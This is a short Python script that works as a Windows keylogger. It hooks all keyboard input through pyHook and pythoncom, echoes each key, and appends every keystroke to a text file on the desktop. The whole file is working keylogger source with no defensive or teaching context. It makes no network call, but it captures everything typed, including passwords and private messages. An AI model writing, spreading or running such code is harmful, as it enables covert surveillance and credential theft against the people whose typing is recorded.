import pyHook,pythoncom

#filepath="C:/Users/new/Desktop/keylog.txt"
def OnKeyBoardEvent(event): 
    print(chr(event.Ascii))
    filepath=open("C:/Users/new/Desktop/keylog.txt","a")
    filepath.write(chr(event.Ascii))
    filepath.close()
    return True
    
    
    #return True

    


hm=pyHook.HookManager()
hm.KeyDown=OnKeyBoardEvent            #Tells hookmanager what to do when key is pressed
hm.HookKeyboard()
pythoncom.PumpMessages()
